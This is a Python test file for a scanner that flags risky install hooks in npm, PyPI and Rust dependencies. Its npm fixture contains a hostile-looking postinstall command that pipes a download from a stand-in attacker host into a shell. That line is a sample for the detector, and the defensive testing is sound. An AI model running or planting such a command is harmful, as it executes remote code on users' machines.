"""Tests for thresher.scanners.install_hooks."""

from __future__ import annotations

from thresher.scanners.install_hooks import parse_install_hooks_output


class TestParseInstallHooksOutput:
    def test_empty_output(self):
        raw = {"scanner": "install-hooks", "findings": [], "total": 0}
        findings = parse_install_hooks_output(raw)
        assert findings == []

    def test_npm_hook_finding(self):
        raw = {
            "scanner": "install-hooks",
            "findings": [
                {
                    "type": "npm_install_hook",
                    "file": "/opt/deps/npm/evil-pkg/package.json",
                    "hook": "postinstall",
                    "script": "curl http://evil.com | sh",
                    "severity": "critical",
                    "description": "npm postinstall script detected: curl http://evil.com | sh",
                }
            ],
            "total": 1,
        }
        findings = parse_install_hooks_output(raw)
        assert len(findings) == 1
        f = findings[0]
        assert f.source_tool == "install-hooks"
        assert f.category == "install_hook"
        assert f.severity == "critical"
        assert "postinstall" in f.title
        assert f.file_path == "/opt/deps/npm/evil-pkg/package.json"

    def test_python_cmdclass_finding(self):
        raw = {
            "scanner": "install-hooks",
            "findings": [
                {
                    "type": "python_cmdclass",
                    "file": "/opt/deps/pypi/sneaky/setup.py",
                    "hook": "cmdclass",
                    "severity": "high",
                    "description": "setup.py contains cmdclass overrides that run during install",
                }
            ],
            "total": 1,
        }
        findings = parse_install_hooks_output(raw)
        assert len(findings) == 1
        f = findings[0]
        assert f.severity == "high"
        assert f.category == "install_hook"
        assert "cmdclass" in f.title

    def test_rust_build_script_finding(self):
        raw = {
            "scanner": "install-hooks",
            "findings": [
                {
                    "type": "rust_build_script",
                    "file": "/opt/deps/crates/sus-crate/build.rs",
                    "hook": "build.rs",
                    "severity": "critical",
                    "description": "build.rs detected with network/download activity",
                }
            ],
            "total": 1,
        }
        findings = parse_install_hooks_output(raw)
        assert len(findings) == 1
        f = findings[0]
        assert f.severity == "critical"
        assert "build.rs" in f.title

    def test_multiple_findings(self):
        raw = {
            "scanner": "install-hooks",
            "findings": [
                {
                    "type": "npm_install_hook",
                    "file": "/opt/deps/pkg1/package.json",
                    "hook": "preinstall",
                    "severity": "high",
                    "description": "npm preinstall detected",
                },
                {
                    "type": "python_cmdclass",
                    "file": "/opt/deps/pkg2/setup.py",
                    "hook": "cmdclass",
                    "severity": "medium",
                    "description": "cmdclass override",
                },
            ],
            "total": 2,
        }
        findings = parse_install_hooks_output(raw)
        assert len(findings) == 2
        assert findings[0].id != findings[1].id

    def test_missing_findings_key(self):
        raw = {"scanner": "install-hooks"}
        findings = parse_install_hooks_output(raw)
        assert findings == []

    def test_finding_ids_are_unique(self):
        raw = {
            "scanner": "install-hooks",
            "findings": [
                {"type": "npm_install_hook", "hook": "preinstall", "severity": "high", "description": "a"},
                {"type": "npm_install_hook", "hook": "postinstall", "severity": "high", "description": "b"},
            ],
            "total": 2,
        }
        findings = parse_install_hooks_output(raw)
        ids = [f.id for f in findings]
        assert len(ids) == len(set(ids))
